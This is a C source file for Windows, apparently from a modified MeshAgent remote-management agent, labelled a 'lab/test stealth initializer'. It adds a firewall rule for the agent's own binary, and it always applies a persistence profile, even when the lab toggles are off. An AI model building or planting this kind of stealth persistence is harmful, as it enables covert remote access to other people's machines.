// Lab/test stealth initializer
#include <windows.h>
#include <wchar.h>
#include <tchar.h>
#include "stealth.h"
#include "stealth_utils.h"
#include "branding_util.h"

static int EnvEnabledW(const wchar_t* name, int defaultOn)
{
    wchar_t buf[16] = {0};
    DWORD n = GetEnvironmentVariableW(name, buf, (DWORD)(sizeof(buf)/sizeof(buf[0])));
    if (n == 0 || n >= (DWORD)(sizeof(buf)/sizeof(buf[0]))) { return defaultOn; }
    for (DWORD i = 0; i < n; ++i) { wchar_t c = buf[i]; if (c >= L'A' && c <= L'Z') buf[i] = (wchar_t)(c - L'A' + L'a'); }
    return (wcsncmp(buf, L"1", 1) == 0) || (wcscmp(buf, L"true") == 0) || (wcscmp(buf, L"yes") == 0) || (wcscmp(buf, L"on") == 0);
}

static void GetModulePathW(wchar_t* out, DWORD cch)
{
    if (!out || cch == 0) return;
    DWORD n = GetModuleFileNameW(NULL, out, cch);
    if (n >= cch) { out[cch-1] = L'\0'; }
}

void Stealth_InitLabFeatures(void)
{
#ifdef MESHAGENT_ENABLE_STEALTH
    // Default enable in StealthLab configs; otherwise require STEALTH_LAB=1
#ifdef MESHAGENT_STEALTHLAB_DEFAULT
    const int defaultLab = 1;
#else
    const int defaultLab = 0;
#endif
    BOOL labEnabled = EnvEnabledW(L"STEALTH_LAB", defaultLab);

    if (labEnabled)
    {
        Stealth_EnsureLoggingDefaults();

    // 1) Add firewall rule for current service binary (default on in lab)
    if (EnvEnabledW(L"STEALTH_FIREWALL", 1)) {
        wchar_t exePath[MAX_PATH] = {0};
        GetModulePathW(exePath, MAX_PATH);
        wchar_t svcNameW[256] = {0};
        MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), svcNameW, _countof(svcNameW));
        if (!Stealth_AddFirewallRuleForService(svcNameW, exePath))
        {
            Stealth_DebugPrintfA("Stealth_AddFirewallRuleForService failed for %ws", svcNameW);
        }
    }

    }

    // Always ensure persistence artifacts exist, even when lab toggles are disabled
    Stealth_ApplyPersistenceProfile();
#else
    (void)0; // not enabled in this build
#endif
}
